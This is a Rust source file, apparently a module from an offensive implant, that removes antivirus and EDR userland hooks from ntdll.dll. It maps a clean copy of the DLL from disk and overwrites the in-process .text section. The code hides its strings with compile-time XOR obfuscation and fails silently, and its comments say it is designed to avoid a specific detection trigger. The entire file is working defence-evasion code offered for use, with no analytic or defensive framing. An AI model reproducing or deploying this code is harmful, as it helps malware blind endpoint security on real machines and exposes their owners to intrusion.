// evasion.rs — NTDLL unhooking via disk file mapping
//
// Maps ntdll.dll from disk using CreateFileMapping/MapViewOfFile, locates
// the clean .text section in the raw file view, and copies it over the
// in-process .text section to remove any AV/EDR userland hooks.
//
// No child process is spawned — eliminates the AmsiRegistrationProtection
// behavioral trigger caused by reading memory from a suspended process.
//
// Raw file mapping uses PointerToRawData (file offsets), not VirtualAddress.
// Copy size is min(VirtualSize, SizeOfRawData) to avoid reading past EOF.
//
// All strings XOR-obfuscated at compile time. Fails silently.

use std::ffi::c_void;
use windows::core::PCSTR;
use windows::Win32::Foundation::CloseHandle;
use windows::Win32::Storage::FileSystem::{
    CreateFileA, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_READ, OPEN_EXISTING,
};
use windows::Win32::System::Diagnostics::Debug::{IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER};
use windows::Win32::System::LibraryLoader::GetModuleHandleA;
use windows::Win32::System::Memory::{
    CreateFileMappingA, MapViewOfFile, UnmapViewOfFile,
    FILE_MAP_READ, PAGE_EXECUTE_WRITECOPY, PAGE_PROTECTION_FLAGS, PAGE_READONLY,
    VirtualProtect,
};
use windows::Win32::System::SystemServices::{
    IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE, IMAGE_NT_SIGNATURE,
};

// ── Compile-time string obfuscation ───────────────────────────────────────────

const KEY: u8 = 0x4E;

const fn obfuscate<const N: usize>(s: &[u8; N]) -> [u8; N] {
    let mut out = [0u8; N];
    let mut i = 0;
    while i < N {
        out[i] = s[i] ^ KEY;
        i += 1;
    }
    out
}

// "ntdll.dll\0"
const OBF_NTDLL: [u8; 10] = obfuscate(b"ntdll.dll\0");
// "C:\Windows\System32\ntdll.dll\0"
const OBF_NTDLL_PATH: [u8; 30] = obfuscate(b"C:\\Windows\\System32\\ntdll.dll\0");

fn decode(enc: &[u8]) -> Vec<u8> {
    enc.iter().map(|&b| b ^ KEY).collect()
}

// ── Evasion entry point ────────────────────────────────────────────────────────

pub fn evade() {
    unsafe {
        let _ = unhook_ntdll();
    }
}

// ── NTDLL unhooking via file mapping ──────────────────────────────────────────

unsafe fn unhook_ntdll() -> windows::core::Result<()> {
    // Get in-process ntdll base
    let dll_name = decode(&OBF_NTDLL);
    let h_ntdll  = GetModuleHandleA(PCSTR(dll_name.as_ptr()))?;
    let module   = h_ntdll.0 as *mut c_void;

    // Validate in-process PE headers
    let dos = module as *const IMAGE_DOS_HEADER;
    if (*dos).e_magic != IMAGE_DOS_SIGNATURE {
        return Ok(());
    }
    let nt = (module as usize + (*dos).e_lfanew as usize) as *const IMAGE_NT_HEADERS64;
    if (*nt).Signature != IMAGE_NT_SIGNATURE {
        return Ok(());
    }

    // Map ntdll.dll from disk — no process spawn needed
    let path   = decode(&OBF_NTDLL_PATH);
    let h_file = CreateFileA(
        PCSTR(path.as_ptr()),
        0x80000000u32, // GENERIC_READ
        FILE_SHARE_READ,
        None,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        None,
    )?;

    let h_map = CreateFileMappingA(h_file, None, PAGE_READONLY, 0, 0, PCSTR::null())?;
    let view  = MapViewOfFile(h_map, FILE_MAP_READ, 0, 0, 0);

    if view.Value.is_null() {
        let _ = CloseHandle(h_map);
        let _ = CloseHandle(h_file);
        return Ok(());
    }

    // Walk sections from in-process headers; source from raw file view
    let section_base =
        (nt as usize + size_of::<IMAGE_NT_HEADERS64>()) as *const IMAGE_SECTION_HEADER;

    for i in 0..(*nt).FileHeader.NumberOfSections as usize {
        let sec  = &*section_base.add(i);
        let name = std::str::from_utf8(&sec.Name).unwrap_or("").trim_matches('\0');
        if name != ".text" {
            continue;
        }

        // In-process destination uses VirtualAddress; raw file source uses PointerToRawData
        let hooked    = (module as usize + sec.VirtualAddress as usize) as *mut c_void;
        let clean     = (view.Value as usize + sec.PointerToRawData as usize) as *mut c_void;
        let copy_size = (sec.Misc.VirtualSize as usize).min(sec.SizeOfRawData as usize);

        let mut old = PAGE_PROTECTION_FLAGS(0);
        if VirtualProtect(hooked, copy_size, PAGE_EXECUTE_WRITECOPY, &mut old).is_ok() {
            std::ptr::copy_nonoverlapping(clean, hooked, copy_size);
            let _ = VirtualProtect(hooked, copy_size, old, &mut old);
        }
        break;
    }

    let _ = UnmapViewOfFile(view);
    let _ = CloseHandle(h_map);
    let _ = CloseHandle(h_file);
    Ok(())
}
